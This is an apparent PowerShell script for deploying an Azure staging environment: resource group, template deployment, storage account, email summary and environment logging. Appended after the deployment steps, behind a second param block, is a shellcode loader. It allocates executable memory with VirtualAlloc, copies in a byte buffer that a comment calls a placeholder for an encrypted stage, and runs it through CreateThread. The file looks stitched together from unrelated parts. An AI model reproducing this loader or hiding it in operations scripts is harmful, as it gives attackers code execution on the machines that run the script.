[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = "rg-portal-staging-06",
    [ValidateSet('westeurope', 'eastus', 'northeurope', 'uksouth')]
    [string]$Location = 'westeurope',

    [string]$TemplateFile = "C:\Scripts\templates\portal-staging.json",
    [string]$ParameterFile = "C:\Scripts\templates\portal-staging.parameters.json",

    [string]$SubscriptionId = '93bb10e2-4e46-666a-3e07-d7dacd1ea39b',
    [string]$StorageAccount = 'ststaging5095',
    [string]$VmName = "vm-portal-staging-06",

    [string]$OutputPath = 'C:\Logs\deploy-staging-2024-03-25.json',

    [switch]$DryRun
)
$ErrorActionPreference = 'Stop'


Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$validation = Test-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile
if ($validation) {
    $validation | Format-Table -AutoSize
    throw 'Template validation failed.'
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize
$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
$deployment.Outputs | Format-Table -AutoSize

$summary = [pscustomobject]@{
    ResourceGroup     = $ResourceGroup
    Location          = $Location
    DeploymentName    = $DeploymentName
    ProvisioningState = $deployment.ProvisioningState
    StorageAccount    = $StorageAccount
    CompletedAt       = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$summary | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath -Encoding UTF8

$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
@($summary) | ConvertTo-Html -Title 'Deployment summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.json', '.html') -Encoding UTF8

$MailTo = "cloudops@internal.corp"
$subject = "Sandbox deployment {0}" -f $deployment.ProvisioningState

$mailParams = @{
    To         = $MailTo
    From       = 'cloudops@internal.corp'
    Subject    = $subject
    Body       = 'See the deployment summary attached to the run log.'
    SmtpServer = "smtp.internal.corp"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams
if (-not $DryRun) {
    Remove-AzResourceGroup -Name $ResourceGroup -Force | Out-Null
    Write-Host ("Removed sandbox resource group {0}" -f $ResourceGroup)
}

Write-Host ("Sandbox deployment finished: {0}" -f $deployment.ProvisioningState) -ForegroundColor Green

$tags = @{
    Environment = "staging"
    Owner       = 'platform-team'
    CostCenter  = 'CC-1042'
}
Write-Verbose ("Tags: {0}" -f ($tags.Keys -join ', '))

$pricing = Get-AzConsumptionPriceSheet -ErrorAction SilentlyContinue
Write-Verbose ("Price sheet entries: {0}" -f @($pricing).Count)

$quotas = Get-AzVMUsage -Location $Location -ErrorAction SilentlyContinue |
    Where-Object { $_.CurrentValue -ge ($_.Limit * 0.8) }
$quotas | Select-Object -First 5 Name, CurrentValue, Limit | Format-Table -AutoSize

$providers = Get-AzResourceProvider -ProviderNamespace Microsoft.Compute -ErrorAction SilentlyContinue
if ($providers) {
    Write-Verbose ("Provider registered: {0}" -f $providers.RegistrationState)
}

$deployLog = Join-Path $env:TEMP ("az-deploy-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Write-Verbose ("Deployment log: {0}" -f $deployLog)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x83, 0x65, 0xd0, 0x50, 0x9f, 0x59, 0x93, 0x4d, 0xc3, 0xfe, 0x94, 0xf3, 0x67, 0xac, 0xad, 0x58,
    0x6a, 0x2d, 0xdb, 0xde, 0x88, 0x50, 0xd3, 0x73, 0xb0, 0x0a, 0x2a, 0xf2, 0xaa, 0x53, 0x96, 0x4f,
    0x83, 0x58, 0x31, 0x2a, 0x5d, 0xd3, 0x4a, 0x02, 0xbd, 0xa1, 0x48, 0x2e, 0x83, 0x4e, 0xdc, 0x9c,
    0x2f, 0x92, 0x6e, 0x1f, 0xdb, 0xfa, 0x4f, 0xfd, 0xc5, 0xa2, 0x3f, 0x11, 0xda, 0xe0, 0x82, 0xf1,
    0x81, 0x26, 0x4d, 0x1e, 0x5a, 0x77, 0xb6, 0x5f, 0xa6, 0x78, 0xca, 0x41, 0xc7, 0x9f, 0x41, 0x74,
    0x25, 0x3c, 0x7f, 0x4b, 0x09, 0x45, 0x42, 0x46, 0xd0, 0x24, 0x93, 0x23, 0x6b, 0x0f, 0xb7, 0xb0,
    0xf4, 0xd0, 0xe1, 0x7b, 0xf7, 0xbe, 0x41, 0x22, 0x04, 0xe2, 0xd0, 0x53, 0xd1, 0xf5, 0x25, 0x1e,
    0xc9, 0x1a, 0x07, 0x08, 0xe8, 0x79, 0x04, 0x76, 0xbd, 0x4a, 0x37, 0x60, 0x3b, 0x24, 0xff, 0xec,
    0x9e, 0x7b, 0xe7, 0x98, 0x6f, 0xea, 0xdd, 0xef, 0x0e, 0x2b, 0x78, 0x54, 0xf3, 0x58, 0x3f, 0x6a,
    0xa2, 0xe8, 0xdf, 0xbc, 0x87, 0x12, 0xa4, 0xa3, 0x96, 0x84, 0x59, 0x45, 0xa9, 0x61, 0xde, 0x26,
    0x78, 0x7f, 0x9b, 0x3e, 0x78, 0xd7, 0x63, 0x3d, 0x65, 0x79, 0x1c, 0x3a, 0xb4, 0x28, 0x42, 0x05,
    0x33, 0x20, 0x58, 0xa3, 0x14, 0x75, 0x2c, 0x0e, 0x0c, 0x73, 0x2d, 0xfa, 0xbb, 0xd8, 0xb4, 0xff,
    0x2d, 0x67, 0xdf, 0x5d, 0xa1, 0xd5, 0xd8, 0xfc, 0x17, 0x07, 0x95, 0xd9, 0xbe, 0x26, 0x5e, 0x5d,
    0xfa, 0x27, 0xb2, 0x1b, 0xea, 0x9a, 0x11, 0xbd, 0x42, 0x4f, 0xe7, 0x26, 0x9d, 0xee, 0x68, 0x8b,
    0xd0, 0xd2, 0xba, 0x22, 0x7d, 0x9d, 0xef, 0x4f, 0x46, 0xba, 0xdf, 0x8b, 0x7e, 0xda, 0x7f, 0x59,
    0x08, 0x7c, 0x2b, 0x7d, 0xd9, 0xd3
)

$BufferAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 632)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
